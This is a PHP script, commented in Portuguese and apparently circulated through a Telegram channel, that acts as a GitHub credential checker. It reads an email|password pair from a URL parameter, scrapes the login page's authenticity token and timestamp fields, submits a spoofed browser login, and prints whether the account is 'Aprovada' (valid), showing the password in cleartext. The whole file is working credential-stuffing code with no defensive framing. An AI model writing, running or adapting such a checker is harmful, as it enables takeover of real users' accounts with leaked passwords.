<?php

//Coder: Mateuzinho
//Telegram: https://t.me/Mateuscoding
//Como usar ? http://localhost/github/api.php?lista=seuemail|suasenha

function getContent($url, &$cookieFile) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36');
    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Erro: ' . curl_error($ch);
    }
    curl_close($ch);
    return $response;
}


function postContent($url, $data, &$cookieFile) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile); 
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded',
        'Cache-Control: max-age=0',
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Referer: https://github.com/login'
    ]);
    $response = curl_exec($ch);
    $info = curl_getinfo($ch);
    if (curl_errno($ch)) {
        echo 'Erro: ' . curl_error($ch);
    }
    curl_close($ch);
    return ['response' => $response, 'info' => $info];
}

// Função para verificar o status do login
function checkLoginStatus($response) {
    if (strpos($response, 'Incorrect username or password') !== false) {
        return 'Reprovada';
    } else {
        return 'Aprovada';
    }
}

function multiexplode($delimiters, $string) {
    $ready = str_replace($delimiters, $delimiters[0], $string);
    $launch = explode($delimiters[0], $ready);
    return $launch;
}


$loginUrl = 'https://github.com/login';
$sessionUrl = 'https://github.com/session';
$cookieFile = tempnam(sys_get_temp_dir(), 'cookie');

$response = getContent($loginUrl, $cookieFile);

preg_match('/name="authenticity_token" value="([^"]+)"/', $response, $matchesAuthToken);
preg_match('/name="timestamp" value="([^"]+)"/', $response, $matchesTimestamp);
preg_match('/name="timestamp_secret" value="([^"]+)"/', $response, $matchesTimestampSecret);

$authenticityToken = $matchesAuthToken[1] ?? '';
$timestamp = $matchesTimestamp[1] ?? '';
$timestampSecret = $matchesTimestampSecret[1] ?? '';


$lista = $_GET['lista'] ?? '';
$lista = str_replace(" ", "", $lista);
$separadores = array(",", "|", ":", "'", " ", "~", ";");
$explode = multiexplode($separadores, $lista);

$email = $explode[0] ?? '';
$senha = $explode[1] ?? '';

echo "<h2>Status do Login</h2>";
echo "<table border='1'>
        <tr>
            <th>Status</th>
            <th>Email</th>
            <th>Senha</th>
        </tr>";

if ($lista) {

    $data = [
        'commit' => 'Sign in',
        'authenticity_token' => $authenticityToken,
        'add_account' => '',
        'login' => $email,
        'password' => $senha,
        'webauthn-conditional' => 'undefined',
        'javascript-support' => 'true',
        'webauthn-support' => 'supported',
        'webauthn-iuvpaa-support' => 'unsupported',
        'return_to' => 'https://github.com/join/welcome',
        'allow_signup' => '',
        'client_id' => '',
        'integration' => '',
        'required_field_8c35' => '',
        'timestamp' => $timestamp,
        'timestamp_secret' => $timestampSecret
    ];


    $responseData = postContent($sessionUrl, $data, $cookieFile);

    $status = checkLoginStatus($responseData['response']);
    
    echo "<tr>
            <td>$status</td>
            <td>$email</td>
            <td>$senha</td>
        </tr>";
} else {
    echo "<tr>
            <td colspan='3'>Nenhuma credencial fornecida</td>
        </tr>";
}

echo "</table>";

unlink($cookieFile);
?>
